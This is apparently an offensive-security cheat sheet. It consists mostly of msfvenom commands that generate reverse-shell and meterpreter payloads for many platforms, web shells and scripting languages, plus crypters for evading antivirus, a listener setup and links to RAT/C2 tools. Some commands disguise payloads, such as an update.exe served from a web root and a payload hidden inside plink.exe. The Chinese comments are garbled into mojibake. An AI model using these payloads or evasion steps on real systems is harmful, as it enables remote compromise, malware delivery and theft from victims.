**[Veil](https://github.com/Veil-Framework/Veil)**
```bash
git clone https://github.com/Veil-Framework/Veil.git
cd Veil/setup/
sudo ./setup.sh â€“c
sudo ./Veil.py
```

**[HERCULES](https://github.com/noosec/HERCULES)**
```bash
ç¡®ä¿ç”µè„‘é‡Œæœ‰ Go
git clone https://github.com/noosec/HERCULES.git
cd HERCULES
wget -c https://github.com/fatih/color
go get github.com/fatih/color
go run Setup.go
cp -rf /root/go/src/github.com /usr/lib/go-1.7/src/github.com
cd SOURCE/
go run HERCULES.go
```

**[ASWCrypter](https://github.com/AbedAlqaderSwedan1/ASWCrypter)**

**[Shellter](https://www.shellterproject.com/)**

**[foolav](https://github.com/hvqzao/foolav)**

**[shellter](https://www.shellterproject.com/download/)**

**[hyperion](https://github.com/nullsecuritynet/tools/tree/master/binary/hyperion)**
```bash
unzip hyperion.zip
cd hyperion/
i586-mingw32msvc-g++ Src/Crypter/*.cpp -o hyperion.exe
wine hyperion.exe shell.exe(ä¹‹å‰ç”¨ msf ç”Ÿæˆçš„æ–‡ä»¶) crypted.exe(æ··æ·†ä¹‹åçš„æ–‡ä»¶)
```

## msfvenom

msfvenom å¯ç”¨äºç”Ÿæˆæ­£å‘æˆ–åå‘ shell çš„ payloadï¼Œé…åˆ meterpreter ä½¿ç”¨è¿›è¡Œæ¸—é€æµ‹è¯•ç›¸å½“æ–¹ä¾¿ï¼Œä¸è¿‡åœ¨å®é™…ä½¿ç”¨æ—¶ï¼Œéœ€è¦è¿›è¡Œç›¸åº”çš„å…æ€å¤„ç†

**æŸ¥çœ‹**
```bash
msfvenom -l [ payloads | encoders | nops | platforms | archs | encrypt | formats | all ]
```

**è¿æ¥**
```bash
msfconsole
use exploit/multi/handler
set payload <payload-name>      # ä¾‹å¦‚ set payload windows/x64/meterpreter_reverse_tcp
set lhost <lhost>
set lport <lport>
set EnableStageEncoding false
set ExitOnSession false
exploit -j -z
```

### binaries

**linux**
```
msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=your-ip lport=your-port -f elf > shell.elf

msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.3.226 LPORT=8888 -f elf -o x86_linux.elf

msfvenom -a x64 --platform Linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.3.226 LPORT=8888 -f elf -o x6_4linux.elf
```

**windows**
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=xxxx -f exe > ./vu.exe

msfvenom --payload windows/meterpreter/reverse_tcp LHOST=********* LPORT=8080 -f exe --platform windows --arch x86 -e x86/shikata_ga_nai -i 10 > /var/www/html/update.exe

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.3.226 LPORT=6666 -a x86 --platform Windows -f dll >x86.dll

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.3.226 LPORT=6666 --platform Windows -f dll >x64.dll

```

**mac**
```
msfvenom -p osx/x86/shell_reverse_tcp lhost=your-ip  lport=your-port -f macho > shell.macho

msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=192.168.3.226 LPORT=8888 -f macho -o payload.macho
```

**android**
```
msfvenom -p android/meterpreter/shell_reverse_tcp lhost=your-ip  lport=your-port -f apk > shell.apk
```

### web payloads

**php**
```
msfvenom -p php/meterpreter_reverse_tcp lhost=your-ip lport=your-port -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```

**asp**
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=your-ip lport=your-port -f asp > shell.asp
```

**Aspx**
```
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.3.226 LPORT=8888 -f aspx -o payload.aspx
```

**jsp**
```
msfvenom -p java/jsp_shell_reverse_tcp lhost=your-ip lport=your-port -f raw > shell.jsp
```

**war**
```
msfvenom -p java/jsp_shell_reverse_tcp lhost=your-ip lport=your-port -f war > shell.war
```

**javascript**
```
msfvenom -p windows/shell_reverse_tcp lhost=your-ip lport=your-port -f js_le -e generic/none

msfvenom -p linux/x86/shell_reverse_tcp lhost=your-ip lport=your-port CMD=/bin/bash -f js_le -e generic/none
```

**Nodejs**
```
msfvenom -p nodejs/shell_reverse_tcp LHOST=192.168.3.226 LPORT=8888 -f raw -o payload.js
```

### scripting payloads

**python**
```
msfvenom -p cmd/unix/reverse_python lhost=your-ip lport=your-port -f raw > shell.py
```

**jar**
```
msfvenom -p java/meterpreter/reverse_tcp lhost=your-ip lport=your-port -f raw -o shell.jar
```

**bash**
```
msfvenom -p cmd/unix/reverse_bash lhost=your-ip lport=your-port -f raw > shell.sh
```

**perl**
```
msfvenom -p cmd/unix/reverse_perl lhost=your-ip lport=your-port -f raw > shell.pl
```

**vbscript**
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=your-ip lport=your-port exitfunc=thread -f vbs -a x86 --platform windows > shell.vbs
C:\Documents and Settings\Administrator>cscript shell.vbs
```

**Powershell**
```
msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -e cmd/powershell_base64 -i 3 -f raw -o payload.ps1

msfvenom -a x86 --platform windows -p windows/powershell_reverse_tcp LHOST=192.168.3.226 LPORT=8888 -e cmd/powershell_base64 -i 3 -f raw -o x86_shell.ps1

msfvenom -a x64 --platform windows -p windows/x64/powershell_reverse_tcp LHOST=192.168.3.226 LPORT=8888 -e cmd/powershellbase64 -i 3 -f raw -o x64_shell.ps1
```

**Ruby**
```
msfvenom -p ruby/shell_reverse_tcp LHOST=192.168.3.226 LPORT=8888 -f raw -o payload.rb
```

**Lua**
```
msfvenom -p cmd/unix/reverse_lua LHOST=192.168.3.226 LPORT=8888 -f raw -o payload.lua
```

### shellcode

**linux based shellcode**
```
msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=your-ip lport=your-port -f <language>
```

**windows based shellcode**
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=your-ip lport=your-port -f <language>
```

**mac based shellcode**
```
msfvenom -p osx/x86/shell_reverse_tcp lhost=your-ip lport=your-port -f <language>
```

---

## msfencode
```
msfvenom windows/shell_reverse_tcp lhost=your-ip lport=your-port R -e x86/shikata_ga_nai -t exe -c -9 -x /usr/share/windows-binaries/plink.exe(è½½ä½“) -o ./shell.exe
```

---

# C2-RAT
**å·¥å…·**
- [trustedsec/trevorc2](https://github.com/trustedsec/trevorc2)
- [AhMyth/AhMyth-Android-RAT](https://github.com/AhMyth/AhMyth-Android-RAT)
- [neoneggplant/EggShell](https://github.com/neoneggplant/EggShell)
